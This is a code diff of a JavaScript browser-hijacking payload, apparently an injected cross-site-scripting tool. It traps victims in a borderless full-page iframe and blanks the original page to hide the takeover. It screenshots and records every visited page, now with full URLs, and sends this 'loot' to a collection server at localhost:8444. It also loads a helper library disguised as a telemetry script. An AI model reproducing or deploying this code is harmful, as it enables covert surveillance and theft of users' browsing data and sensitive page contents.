@@ -152,7 +152,6 @@ function sendScreenshot()
 	}
 	// console.log("---Snagging screenshot...");
 
-//	html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
 	html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
 	{
 		function responseHandler() 
@@ -165,10 +164,9 @@ function sendScreenshot()
 		request.open("POST", "http://localhost:8444/loot/screenshot/" + sessionName);
 
 
+		// Helps hide flashing of the page when clicking around
 		if (setBackgroundImage)
 		{
-			// Helps hide flashing of the page when clicking around
-			//console.log("+++ Setting background image...");
 			document.body.style.backgroundImage = 'url('+canvas.toDataURL("image/png")+')';
 			document.body.style.backgroundRepeat = "no-repeat";
 			document.body.style.backgroundSize = "auto";
@@ -338,6 +336,10 @@ function checkLocalStorage()
 function runUpdate()
 {
 	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
+	var fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
+	// console.log("$$$ Location: " + document.getElementById("iframe_a").contentDocument.location);
+	// console.log("$$$ Path: " + document.getElementById("iframe_a").contentDocument.location.pathname);
+	// console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);
 
 	// New page, let's steal stuff
 	if (lastFakeUrl != fakeUrl)
@@ -353,7 +355,7 @@ function runUpdate()
 		request.open("POST", "http://localhost:8444/loot/location/" + sessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
-		jsonObj["url"] = fakeUrl;
+		jsonObj["url"] = fullUrl;
 		var jsonString = JSON.stringify(jsonObj);
 		request.send(jsonString);
 
@@ -403,6 +405,7 @@ function takeOver()
 	// Setup our iframe trap
 	var iframe = document.createElement("iframe");
 	iframe.setAttribute("src", startingPage);
+	iframe.setAttribute("style", "border:none");
 
 	if (fullscreenIframe)
 	{
@@ -443,16 +446,18 @@ function takeOver()
 // ********************************************
 // Go time
 
+// Blank the page so it doesn't show through as users 
+// navigate inside the iframe
+document.body.innerHTML = "";
+document.body.outerHTML = "";
+
+
 // Pull in html2canvas
 var js = document.createElement("script");
 js.type = "text/javascript";
 js.src = "http://localhost:8444/lib/telemhelperlib.js";
 document.body.appendChild(js);
 
-// Blank the page so it doesn't show through as users 
-// navigate inside the iframe
-document.body.innerHTML = "";
-document.body.outerHTML = "";
 
 // Pick our session ID
 initSession();
